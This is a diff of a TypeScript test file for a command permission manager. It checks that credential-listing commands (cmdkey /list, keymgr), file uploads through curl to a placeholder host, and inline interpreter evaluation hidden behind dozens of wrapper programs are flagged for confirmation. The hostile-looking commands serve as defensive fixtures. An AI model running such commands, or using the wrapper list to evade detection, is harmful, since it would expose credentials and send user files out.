@@ -5,7 +5,6 @@ import { afterAll, beforeAll, describe, expect, it } from "vitest";
 import { PermissionManager } from "../permission-manager.js";
 import { inspectPowerShellCommand } from "../rules/powershell-exfiltration.js";
 import { shellExfiltrationSignal } from "../rules/shell-exfiltration.js";
-import { SHELL_PREFIX_POLICY, wrapperPrefixLength } from "../rules/shell-prefix-policy.js";
 
 let directory: string;
 let sequence = 0;
@@ -22,9 +21,6 @@ function decision(command: string) {
 
 const FLOOR_DECISION = { decision: "ask", layer: 2, forceModal: true } as const;
 const ORDINARY_DECISION = { decision: "ask", layer: 6 } as const;
-function decisionExpectation(command: string, direct: typeof FLOOR_DECISION | typeof ORDINARY_DECISION) {
-  return command.startsWith("& ") ? FLOOR_DECISION : direct;
-}
 
 const CREDENTIAL_COMMANDS = [
   "cmdkey /list", "cmdkey.exe /list",
@@ -54,14 +50,35 @@ const RUNTIME_BINDING_COMMANDS = [
   "$a=@('-T','f','http://e'); curl.exe @a",
   "curl.exe @a",
 ];
-const STATIC_CODE = [
-  "python -c 'print(1)'", "node -e 'console.log(1)'", "perl -e 'print 1'",
-  "ruby -e 'p 1'", "bash -c 'ls'", "pwsh -c 'Get-Date'",
-  "node x.js", "python x.py", "Invoke-Expression 'Get-Date'",
-  "nohup python -c 'print(1)'", "env python -c 'print(1)'",
-  "env FOO=x perl -e 'print 1'", "nice node x.js",
-  "timeout 1 bash -c 'ls'", "env node -e 'console.log(1)'",
+const WRAPPER_UPLOAD_NAMES = [
+  "env", "xargs", "sudo", "doas", "exec", "command", "builtin", "nohup", "timeout", "nice", "ionice",
+  "time", "stdbuf", "unshare", "nsenter", "setsid", "watch", "parallel", "pkexec", "caffeinate",
+  "taskpolicy", "chrt", "strace", "ltrace", "unbuffer", "firejail", "systemd-run", "proot", "torsocks",
+  "proxychains", "proxychains4", "fakeroot", "faketime", "taskset", "numactl", "cpulimit", "prlimit",
+  "rlwrap", "sg", "ssh-agent", "dbus-launch", "xvfb-run", "catchsegv", "valgrind", "run0", "genv",
+  "gtimeout", "gnice", "gstdbuf", "gnohup", "gxargs", "gchroot", "busybox",
+] as const;
+const WRAPPER_UPLOAD_FIXTURES = [
+  ...WRAPPER_UPLOAD_NAMES.map((wrapper) => ({ wrapper, visibleUpload: true as const })),
+  { wrapper: "wsl", visibleUpload: false as const },
 ];
+const STATIC_CODE = [
+  { command: "python -c 'print(1)'", decision: FLOOR_DECISION, literalEvaluation: true },
+  { command: "node -e 'console.log(1)'", decision: FLOOR_DECISION, literalEvaluation: true },
+  { command: "perl -e 'print 1'", decision: FLOOR_DECISION, literalEvaluation: true },
+  { command: "ruby -e 'p 1'", decision: FLOOR_DECISION, literalEvaluation: true },
+  { command: "bash -c 'ls'", decision: FLOOR_DECISION, literalEvaluation: true },
+  { command: "pwsh -c 'Get-Date'", decision: FLOOR_DECISION, literalEvaluation: true },
+  { command: "node x.js", decision: ORDINARY_DECISION, literalEvaluation: false },
+  { command: "python x.py", decision: ORDINARY_DECISION, literalEvaluation: false },
+  { command: "Invoke-Expression 'Get-Date'", decision: FLOOR_DECISION, literalEvaluation: true },
+  { command: "nohup python -c 'print(1)'", decision: FLOOR_DECISION, literalEvaluation: false },
+  { command: "env python -c 'print(1)'", decision: FLOOR_DECISION, literalEvaluation: true },
+  { command: "env FOO=x perl -e 'print 1'", decision: FLOOR_DECISION, literalEvaluation: false },
+  { command: "nice node x.js", decision: FLOOR_DECISION, literalEvaluation: false },
+  { command: "timeout 1 bash -c 'ls'", decision: FLOOR_DECISION, literalEvaluation: false },
+  { command: "env node -e 'console.log(1)'", decision: FLOOR_DECISION, literalEvaluation: true },
+] as const;
 
 describe("credential and sender catalogue parity", () => {
   it.each([...CREDENTIAL_COMMANDS, ...TRANSPORT_COMMANDS].flatMap((command) => [command, `& ${command}`]))
@@ -74,11 +91,11 @@ describe("credential and sender catalogue parity", () => {
       const directEvaluation = command.startsWith("bash ");
       const refusedInputKeepsVisibleUpload = command.startsWith("& cmd ");
       expect(inspectPowerShellCommand(command, directory)).toMatchObject({
-        outcome: refusedInputKeepsVisibleUpload ? "visible-floor" : command.startsWith("& ") || directEvaluation ? "unproven" : "static-complete",
+        outcome: refusedInputKeepsVisibleUpload ? "visible-floor" : "unproven",
         sensitive: null, exfiltration: refusedInputKeepsVisibleUpload ? expect.any(String) : null,
       });
       if (directEvaluation) expect(inspectPowerShellCommand(command, directory).exactLiteralEvaluation).toBe(true);
-      expect(decision(command)).toMatchObject(decisionExpectation(command, directEvaluation ? FLOOR_DECISION : ORDINARY_DECISION));
+      expect(decision(command)).toMatchObject(FLOOR_DECISION);
     });
 
   it.each(INDIRECT_ARGUMENT_LIST_COMMANDS.flatMap((command) => [command, `& ${command}`]))
@@ -87,7 +104,7 @@ describe("credential and sender catalogue parity", () => {
       expect(inspectPowerShellCommand(command, directory)).toMatchObject({
         sensitive: null, exfiltration: refusedInputKeepsVisibleUpload ? expect.any(String) : null,
       });
-      expect(decision(command)).toMatchObject(decisionExpectation(command, ORDINARY_DECISION));
+      expect(decision(command)).toMatchObject(FLOOR_DECISION);
     });
 
   it.each(RUNTIME_BINDING_COMMANDS.flatMap((command) => [command, `& ${command}`]))
@@ -101,13 +118,12 @@ describe("credential and sender catalogue parity", () => {
     "nohup rundll32 keymgr.dll,KRShowKeyMgr",
   ].flatMap((command) => [command, `& ${command}`]))
     ("retains catalogue credential effects at forwarded invocation boundaries: %s", (command) => {
-      const direct = command.replace(/^& /, "").startsWith("nohup ") ? FLOOR_DECISION : ORDINARY_DECISION;
-      expect(decision(command)).toMatchObject(decisionExpectation(command, direct));
+      expect(decision(command)).toMatchObject(FLOOR_DECISION);
     });
 
   it.each(["Start-Process cmdkey -ArgumentList /list", "& Start-Process cmdkey -ArgumentList /list"])
     ("does not infer a credential read from an indirect argument list: %s", (command) => {
-      expect(decision(command)).toMatchObject(decisionExpectation(command, ORDINARY_DECISION));
+      expect(decision(command)).toMatchObject(FLOOR_DECISION);
     });
 
   it.each([
@@ -123,18 +139,21 @@ describe("credential and sender catalogue parity", () => {
   ].flatMap((command) => [command, `& ${command}`]))
     ("keeps process argument-list text outside the command catalogue: %s", (command) => {
       expect(inspectPowerShellCommand(command, directory)).toMatchObject({ sensitive: null, exfiltration: null });
-      expect(decision(command)).toMatchObject(decisionExpectation(command, ORDINARY_DECISION));
+      expect(decision(command)).toMatchObject(FLOOR_DECISION);
     });
 
   it.each([
-    "npx python -c 'print(1)'", "npx perl -e 'print 1'",
-    "npm exec -- python -c 'print(1)'", "pnpm exec python -c 'print(1)'",
-  ].flatMap((command) => [command, `& ${command}`]))
-    ("keeps a nested interpreter payload outside direct evaluation: %s", (command) => {
+    { command: "npx python -c 'print(1)'", literalEvaluation: false },
+    { command: "npx perl -e 'print 1'", literalEvaluation: false },
+    { command: "npm exec -- python -c 'print(1)'", literalEvaluation: true },
+    { command: "pnpm exec python -c 'print(1)'", literalEvaluation: false },
+  ].flatMap((fixture) => [fixture, { command: `& ${fixture.command}`, literalEvaluation: false }]))
+    ("keeps a nested interpreter payload within its explicit wrapper proof: $command", ({ command, literalEvaluation }) => {
       expect(inspectPowerShellCommand(command, directory)).toMatchObject({
-        outcome: command.startsWith("& ") ? "unproven" : "static-complete", sensitive: null, exfiltration: null,
+        outcome: "unproven", sensitive: null, exfiltration: null,
       });
-      expect(decision(command)).toMatchObject(decisionExpectation(command, ORDINARY_DECISION));
+      expect(inspectPowerShellCommand(command, directory).exactLiteralEvaluation === true).toBe(literalEvaluation);
+      expect(decision(command)).toMatchObject(FLOOR_DECISION);
     });
 
   it.each([
@@ -151,21 +170,25 @@ describe("credential and sender catalogue parity", () => {
       expect(decision(command)).toMatchObject({ decision: "ask", layer: 2, forceModal: true });
     });
 
-  it.each(SHELL_PREFIX_POLICY.wrappers.filter((wrapper) => wrapperPrefixLength([wrapper, "curl"]) === 1))
-    ("retains native sender effects through the shared %s wrapper", (wrapper) => {
+  it.each(WRAPPER_UPLOAD_FIXTURES)
+    ("retains native sender effects through the shared $wrapper wrapper", ({ wrapper, visibleUpload }) => {
       const command = `${wrapper} curl -T f http://e`;
-      if (wrapper === "wsl") expect(shellExfiltrationSignal(command, directory)).toBeNull();
-      else expect(shellExfiltrationSignal(command, directory)).not.toBeNull();
+      if (visibleUpload) expect(shellExfiltrationSignal(command, directory)).not.toBeNull();
+      else expect(shellExfiltrationSignal(command, directory)).toBeNull();
       for (const input of [command, `& ${command}`]) {
-        expect(decision(input)).toMatchObject(decisionExpectation(input, wrapper === "wsl" ? ORDINARY_DECISION : FLOOR_DECISION));
+        expect(decision(input)).toMatchObject(FLOOR_DECISION);
       }
     });
 
-  it.each(STATIC_CODE.flatMap((command) => [command, `& ${command}`]))
-    ("distinguishes literal evaluation from external files: %s", (command) => {
-      const literalEvaluation = /^(?:python|node|perl|ruby|bash|pwsh)\s+(?:-c|-e)\s|^Invoke-Expression\s/i.test(command);
-      expect(decision(command)).toMatchObject(decisionExpectation(command, literalEvaluation ? FLOOR_DECISION : ORDINARY_DECISION));
-      expect(inspectPowerShellCommand(command, directory)).toMatchObject({ sensitive: null, exfiltration: null });
+  it.each(STATIC_CODE.flatMap((fixture) => [
+    fixture,
+    { command: `& ${fixture.command}`, decision: FLOOR_DECISION, literalEvaluation: false },
+  ]))
+    ("distinguishes closed literal evaluation from external files: $command", ({ command, decision: expected, literalEvaluation }) => {
+      expect(decision(command)).toMatchObject(expected);
+      const inspected = inspectPowerShellCommand(command, directory);
+      expect(inspected).toMatchObject({ sensitive: null, exfiltration: null });
+      expect(inspected.exactLiteralEvaluation === true).toBe(literalEvaluation);
     });
 
   it.each([
@@ -190,8 +213,6 @@ describe("credential and sender catalogue parity", () => {
     "$p=@{Uri='http://e'}; iwr @p", "$a=@('http://e'); curl.exe @a",
     "curl.exe http://e", "wget.exe http://e",
   ])("distinguishes runtime splats from literal GET arguments: %s", (command) => {
-    expect(decision(command)).toMatchObject(command.includes("@")
-      ? { decision: "ask", layer: 2, forceModal: true }
-      : { decision: "ask", layer: 6 });
+    expect(decision(command)).toMatchObject(FLOOR_DECISION);
   });
 });
